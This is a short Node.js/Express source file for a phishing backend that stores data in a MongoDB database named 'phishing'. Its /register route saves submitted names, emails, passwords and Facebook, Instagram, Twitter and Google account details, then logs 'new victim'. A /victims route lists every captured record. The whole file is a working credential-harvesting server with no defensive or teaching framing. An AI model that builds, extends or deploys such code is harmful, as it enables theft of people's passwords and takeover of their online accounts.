var express = require('express');
var path = require('path');
var bodyParser = require('body-parser');
var app = express();

app.set('view engine', 'pug');
app.use('/vendor', express.static(path.join(__dirname, 'views/vendor')))
app.use(bodyParser.urlencoded({extended: true}));
app.use(bodyParser.json());

var mongoose = require('mongoose');
mongoose.connect('mongodb://localhost/phishing');

var db = mongoose.connection;
db.on('error', console.error.bind(console, 'MongoDB connection error:'));

var PeopleSchema = mongoose.Schema({
  names: String,
  email: String,
  pass: String,
  facebook: String,
  instagram: String,
  twitter: String,
  google: String
});

var People = mongoose.model('People', PeopleSchema);

// respond with "hello world" when a GET request is made to the homepage
app.get('/', (req, res) => {
  res.render('index');
});

app.post('/register', (req, res) => {
  if (!req.body)
    return res.sendStatus(400);
  people = new People(req.body);
  people.save();
  res.render('register', {user: req.body.names})
  console.log('new victim');
})

app.get('/victims', (req, res) => {
  People.find({}, (err, peoples) => {
    if (!err)
      res.render('victims', {users: peoples});
    else
      console.log(err);
  });
})

app.listen(3000);
